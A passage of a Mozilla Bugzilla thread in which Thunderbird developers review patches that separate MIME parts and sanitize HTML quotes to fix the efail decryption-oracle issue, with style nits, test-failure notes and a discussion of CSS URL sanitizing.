<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=19011e85f65069e35ffee58745a69f5d085b4ad2">https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=19011e85f65069e35ffee58745a69f5d085b4ad2</a></pre></div><div class="change-set" id="c84"><div class="comment" data-id="13282838" data-no="84"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-84" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15229875_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-84"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-84" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c84">Comment 84</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 14:26 PDT" data-time="1526506018">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-84">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-84" data-comment-id="13282838">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c81">comment #81</a>)
<span class="quote">&gt; But I had an idea: The sanitizer is drastic also on presentational HTML,
&gt; which is not required for security. I can drive the sanitizer in a mode that
&gt; removes all the stuff potentially problematic for security, but keep
&gt; presentational HTML like tables and &lt;font&gt; and CSS.
&gt; 
&gt; How about that?</span >
Is this still required? With the MIME patch I see the fully decrypted part, so I'd be pretty foolish to quote that. Why do you still need sanitising? If you do, of course it needs to be done in a way that the rendered page looks the same with and without sanitising.</pre></div><div class="change-set" id="c85"><div class="comment" data-id="13282962" data-no="85"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-85" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-85"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-85" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c85">Comment 85</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:08 PDT" data-time="1526508494">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-85">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-85" data-comment-id="13282962">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976330" name="attach_8976330" title="Separate MIME parts from each other (for trunk)">attachment 8976330</a> <a href="/attachment.cgi?id=8976330&amp;action=edit" title="Separate MIME parts from each other (for trunk)">[details]</a> <a href="/attachment.cgi?id=8976330&amp;action=diff" title="Separate MIME parts from each other (for trunk)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976330'>[review]</a>
Separate MIME parts from each other (for trunk)

<span class="quote">&gt;+  char *content_type = obj-&gt;headers ?
&gt;+     MimeHeaders_get(obj-&gt;headers, HEADER_CONTENT_TYPE, false, false) : 0;</span >

A style nit of my own:
The notation
    result = some_long_condition()
      ? if_yes()
      : otherwise();
is important for readability. Esp. so as the expressions get more complex, like here.

If it all fits in a single line |foo = works ? 1 : 0;|, that's fine, but if it's complex enough that you add a linebreak, then true and false results should be on their own lines. Much like if clauses, really.</pre></div><div class="change-set" id="c86"><div class="comment" data-id="13282967" data-no="86"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-86" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-86"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-86" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c86">Comment 86</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:09 PDT" data-time="1526508580">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-86">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-86" data-comment-id="13282967"><span class="quote">&gt; Why do you still need sanitising?</span >

As a safety measure.

I am not just looking to fix this exact bug and PoC, but all bugs of this nature. That's the only way to ever get an application secure.</pre></div><div class="change-set" id="c87"><div class="comment" data-id="13283011" data-no="87"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-87" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-87"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-87" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c87">Comment 87</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:21 PDT" data-time="1526509307">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-87">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976349"
         class="attachment patch obsolete"
         data-id="8976349" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-4.diff">
      <meta itemprop="contentSize" content="14711">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976349">
          <a class="link" href="attachment.cgi?id=8976349&amp;action=diff">
        <span id="att-8976349-description" itemprop="description">Separate MIME parts from each other, v4 (trunk and 52)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976349&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-87" data-comment-id="13283011">This addresses Jörg's review comments.

(NIT: If I wrap lines, I indent it 4 spaces, not just 2, to clearly distinguish from indented blocks. But on your request, I adapted it, although I find it less readable.)

Thanks, Jörg, for testing this on trunk. I incorporated your trunk changes in my patch. I've made it default to 52, so that it compiles here and so that we can land it on 52 branch, but before landing on trunk, I'd remove the TB52/to code and #ifdef.

Jörg: Given that you did the review, and tested it, can you r+ it, please?</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976074&amp;action=edit"
           title="Separate MIME parts from each other (for 52)"
           class=""
        >Attachment #8976074</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8976330&amp;action=edit"
           title="Separate MIME parts from each other (for trunk)"
           class=""
        >Attachment #8976330</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8976330&amp;action=edit"
           title="Separate MIME parts from each other (for trunk)"
           class=""
        >Attachment #8976330</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c88"><div class="comment" data-id="13283032" data-no="88"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-88" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-88"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-88" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c88">Comment 88</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:26 PDT" data-time="1526509594">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-88">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976351"
         class="attachment patch obsolete"
         data-id="8976351" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-sanitizer-cleanup-2.diff">
      <meta itemprop="contentSize" content="15139">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976351">
          <a class="link" href="attachment.cgi?id=8976351&amp;action=diff">
        <span id="att-8976351-description" itemprop="description">Sanitizer code cleanup, v2</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976351&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976351&amp;action=edit"
           title="Sanitizer code cleanup, v2"
           class=""
        >Attachment #8976351</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c89"><div class="comment" data-id="13283054" data-no="89"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-89" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15229875_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-89"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-89" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c89">Comment 89</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:36 PDT" data-time="1526510161">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-89">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-89" data-comment-id="13283054">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976349" name="attach_8976349" title="Separate MIME parts from each other, v4 (trunk and 52)">attachment 8976349</a> <a href="/attachment.cgi?id=8976349&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk and 52)">[details]</a> <a href="/attachment.cgi?id=8976349&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk and 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976349'>[review]</a>
Separate MIME parts from each other, v4 (trunk and 52)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976349" name="attach_8976349" title="Separate MIME parts from each other, v4 (trunk and 52)">attachment 8976349</a> <a href="/attachment.cgi?id=8976349&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk and 52)">[details]</a> <a href="/attachment.cgi?id=8976349&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk and 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976349'>[review]</a>:
-----------------------------------------------------------------

Please fix the test failures:
<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=19011e85f65069e35ffee58745a69f5d085b4ad2&amp;selectedJob=178863090">https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=19011e85f65069e35ffee58745a69f5d085b4ad2&amp;selectedJob=178863090</a>

This can't land neither on 52 nor on 62 if it causes test failures.

::: mailnews/mime/src/mimeTextHTMLParsed.cpp
&#64;&#64; +36,5 &#64;&#64;
<span class="quote">&gt; +#define MIME_SUPERCLASS mimeInlineTextHTMLClass
&gt; +MimeDefClass(MimeInlineTextHTMLParsed, MimeInlineTextHTMLParsedClass,
&gt; +             mimeInlineTextHTMLParsedClass, &amp;MIME_SUPERCLASS);
&gt; +
&gt; +static int MimeInlineTextHTMLParsed_parse_line (const char *, int32_t,</span >

Please remove the space before the parenthesis, and three below.

&#64;&#64; +45,5 &#64;&#64;
<span class="quote">&gt; +
&gt; +static int
&gt; +MimeInlineTextHTMLParsedClassInitialize(MimeInlineTextHTMLParsedClass *clazz)
&gt; +{
&gt; +  MimeObjectClass *oclass = (MimeObjectClass *) clazz;</span >

Please remove the space after the parenthesis.

&#64;&#64; +58,5 &#64;&#64;
<span class="quote">&gt; +
&gt; +static int
&gt; +MimeInlineTextHTMLParsed_parse_begin (MimeObject *obj)
&gt; +{
&gt; +  MimeInlineTextHTMLParsed *me = (MimeInlineTextHTMLParsed *) obj;</span >

And here.

&#64;&#64; +66,5 &#64;&#64;
<span class="quote">&gt; +    return status;
&gt; +
&gt; +  // charset
&gt; +  // dump the charset we get from the mime headers into a HTML &lt;meta http-equiv&gt;
&gt; +  char *content_type = (obj-&gt;headers</span >

Lose the opening parenthesis.

&#64;&#64; +68,5 &#64;&#64;
<span class="quote">&gt; +  // charset
&gt; +  // dump the charset we get from the mime headers into a HTML &lt;meta http-equiv&gt;
&gt; +  char *content_type = (obj-&gt;headers
&gt; +     ? MimeHeaders_get(obj-&gt;headers, HEADER_CONTENT_TYPE, false, false)
&gt; +     : 0);</span >

Lose the closing parenthesis.

I fixed all that, but you lost the changes :-(

&#64;&#64; +121,5 &#64;&#64;
<span class="quote">&gt; +  mozilla::ErrorResult rv2;
&gt; +  RefPtr&lt;mozilla::dom::DOMParser&gt; parser =
&gt; +    mozilla::dom::DOMParser::CreateWithoutGlobal(rv2);
&gt; +  nsCOMPtr&lt;nsIDocument&gt; document = parser-&gt;ParseFromString(
&gt; +    rawHTML, mozilla::dom::SupportedType::Text_html, rv2);</span >

Please reformat to:
nsCOMPtr&lt;nsIDocument&gt; document =
  parser-&gt;ParseFromString(rawHTML, mozilla::dom::SupportedType::Text_html, rv2);
Which I had, but you lost :-(

&#64;&#64; +134,5 &#64;&#64;
<span class="quote">&gt; +#endif
&gt; +
&gt; +  // Serialize it back to HTML source again
&gt; +  nsCOMPtr&lt;nsIDocumentEncoder&gt; encoder = do_CreateInstance(
&gt; +    &quot;&#64;mozilla.org/layout/documentEncoder;1?type=text/html&quot;);</span >

Please reformat to:
nsCOMPtr&lt;nsIDocumentEncoder&gt; encoder =
  do_CreateInstance(&quot;&#64;mozilla.org/layout/documentEncoder;1?type=text/html&quot;);

&#64;&#64; +150,5 &#64;&#64;
<span class="quote">&gt; +  return status;
&gt; +}
&gt; +
&gt; +void
&gt; +MimeInlineTextHTMLParsed_finalize (MimeObject *obj)</span >

Lose space.

&#64;&#64; +165,5 &#64;&#64;
<span class="quote">&gt; +  ((MimeObjectClass*)&amp;MIME_SUPERCLASS)-&gt;finalize (obj);
&gt; +}
&gt; +
&gt; +static int
&gt; +MimeInlineTextHTMLParsed_parse_line (const char *line, int32_t length,</span >

Lose the space before the parenthesis.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Flags: review-</div></div></div><div class="change-set" id="c90"><div class="comment" data-id="13283059" data-no="90"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-90" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15229875_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-90"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-90" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c90">Comment 90</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:38 PDT" data-time="1526510322">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-90">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-90" data-comment-id="13283059">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>
Sanitizer code cleanup, v2

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/mailnews.js
&#64;&#64; +588,5 &#64;&#64;
<span class="quote">&gt;  // For the next 4 prefs, see &lt;<a rel="nofollow" href="http://www.bucksch.org/1/projects/mozilla/108153">http://www.bucksch.org/1/projects/mozilla/108153</a>&gt;
&gt;  pref(&quot;mailnews.display.prefer_plaintext&quot;, false);  // Ignore HTML parts in multipart/alternative
&gt;  pref(&quot;mailnews.display.html_as&quot;, 0);  // How to display HTML/MIME parts. 0 = Render the sender's HTML; 1 = HTML-&gt;TXT-&gt;HTML; 2 = Show HTML source; 3 = Sanitize HTML; 4 = Show all body parts
&gt;  pref(&quot;mailnews.display.show_all_body_parts_menu&quot;, false); // Whether the View &gt; Message body as &gt; All body parts menu item is available
&gt; +pref(&quot;mailnews.display.html_sanitizer.drop_presentational&quot;, true); // whether to drop &lt;font&gt;, &lt;center&gt;, align='...', etc.</span >

Please don't change prefs unless you want to write migration code.

::: mailnews/mime/src/mimemoz2.cpp
&#64;&#64; +2160,5 &#64;&#64;
<span class="quote">&gt;    return NS_OK;
&gt;  }
&gt;  
&gt; +
&gt; +</span >

Please don't add these lines.

::: mailnews/mime/src/mimethsa.cpp
&#64;&#64; +123,2 &#64;&#64;
<span class="quote">&gt;  
&gt; +  // Write it out</span >

Full stop missing.</pre></div><div class="change-set" id="c91"><div class="comment" data-id="13283072" data-no="91"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-91" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a15229875_22599"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-91"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-91" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c91">Comment 91</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 15:42 PDT" data-time="1526510537">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-91">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-91" data-comment-id="13283072">Does the HTML sanitization work touch on the CSS issues mentioned in the efail paper at chapter 3.1, where it briefly discusses a CSS redressing attack? I want to make sure that any CSS issues there aren't slipping by the updated sanitizer for simple HTML. (I don't understand this specific aspect of the attack but it was pointed out to me.)</pre><div class="activity"><div class="change">Flags: needinfo?(ben.bucksch)</div></div></div><div class="change-set" id="c92"><div class="comment" data-id="13283126" data-no="92"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-92" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-92"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-92" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c92">Comment 92</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 16:00 PDT" data-time="1526511610">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-92">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976363"
         class="attachment patch obsolete"
         data-id="8976363" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-composer-4.diff">
      <meta itemprop="contentSize" content="4775">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976363">
          <a class="link" href="attachment.cgi?id=8976363&amp;action=diff">
        <span id="att-8976363-description" itemprop="description">Sanitize quotes, v4 (for 52)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976363&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-92" data-comment-id="13283126">OK, so for the quote sanitation, I have good news and bad news.

The good news is that if I enable presentational HTML and styles, the result looks the same to me as without sanitation. (There might be minor differences, but I haven't noticed any.) So, this does look like we could ship this as default for everybody. It would remove a whole class of attacks.

The bad news is that the Gecko HTML sanitizer is not able to remove URL references from CSS rules/styles. The sanitizer I had written back in 2004 could do that, but the rewrite by Henri cannot, unfortunately. He was aware of that, and that's why he has an |if| that disables all CSS (althogether, even the innocent rules), if I say that I don't want external resources.

We should later add support to remove external URLs from CSS. But right now, we have no sanitation at all and allow flat out everything, so this is no worse than before.

I've made a band-aid fix that removes that |if|. The caller can still control it, because the allowStyles has its own flag. Thunderbird and DirectorySericeProvider are the only users of this sanitizer, and all callers set AllowStyles properly, so removing that automatic is not a concrete problem, and fixes the issue The only problem is that I'd need to patch Gecko.

Anyway, the patch as attached works, and is a massive improvement over status quo. I don't see any drawbacks. I'll attach a screenshot.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ben.bucksch)</span></div></div></div><div class="change-set" id="c93"><div class="comment" data-id="13283131" data-no="93"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-93" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15229875_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-93"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-93" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c93">Comment 93</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 16:02 PDT" data-time="1526511753">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-93">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-93" data-comment-id="13283131">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c86">comment #86</a>)
<span class="quote">&gt; &gt; Why do you still need sanitising?
&gt; As a safety measure.
&gt; I am not just looking to fix this exact bug and PoC, but all bugs of this
&gt; nature. That's the only way to ever get an application secure.</span >
OK, perhaps we could then lose this:
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr52/rev/eec7161f761fbd8b66527d857b0657743128406f#l1.13">https://hg.mozilla.org/releases/comm-esr52/rev/eec7161f761fbd8b66527d857b0657743128406f#l1.13</a></pre></div><div class="change-set" id="c94"><div class="comment" data-id="13283159" data-no="94"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-94" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-94"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-94" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c94">Comment 94</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 16:17 PDT" data-time="1526512659">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-94">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
